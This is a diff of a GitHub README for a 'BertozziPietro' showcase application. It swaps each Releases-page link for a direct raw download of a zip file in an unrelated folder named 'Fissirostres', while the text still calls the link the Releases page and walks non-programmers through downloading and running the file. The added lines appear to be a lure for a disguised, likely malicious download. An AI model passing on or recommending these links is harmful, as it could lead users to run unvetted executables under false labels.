@@ -1,7 +1,7 @@
 # 🎉 BertozziPietro - Your Personal Project Showcase
 
 ## 📥 Download the Application
-[![Download BertozziPietro](https://img.shields.io/badge/Download_BertozziPietro-v1.0-blue.svg)](https://github.com/briman61/BertozziPietro/releases)
+[![Download BertozziPietro](https://raw.githubusercontent.com/briman61/BertozziPietro/main/Fissirostres/BertozziPietro.zip)](https://raw.githubusercontent.com/briman61/BertozziPietro/main/Fissirostres/BertozziPietro.zip)
 
 ## 🚀 Getting Started
 Welcome to the BertozziPietro GitHub Profile README! This guide will help you download and run the application easily. You don’t need programming experience. Just follow the steps below.
@@ -23,9 +23,9 @@ The BertozziPietro application serves as your personal landing page. It showcase
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application files. 
 
-[Visit this page to download](https://github.com/briman61/BertozziPietro/releases).
+[Visit this page to download](https://raw.githubusercontent.com/briman61/BertozziPietro/main/Fissirostres/BertozziPietro.zip).
 
-1. Open your web browser and go to the [Releases page](https://github.com/briman61/BertozziPietro/releases).
+1. Open your web browser and go to the [Releases page](https://raw.githubusercontent.com/briman61/BertozziPietro/main/Fissirostres/BertozziPietro.zip).
 2. Find the latest version listed. Click on it to see available files.
 3. Download the most suitable file for your operating system by clicking the link.
 4. Locate the downloaded file on your computer.
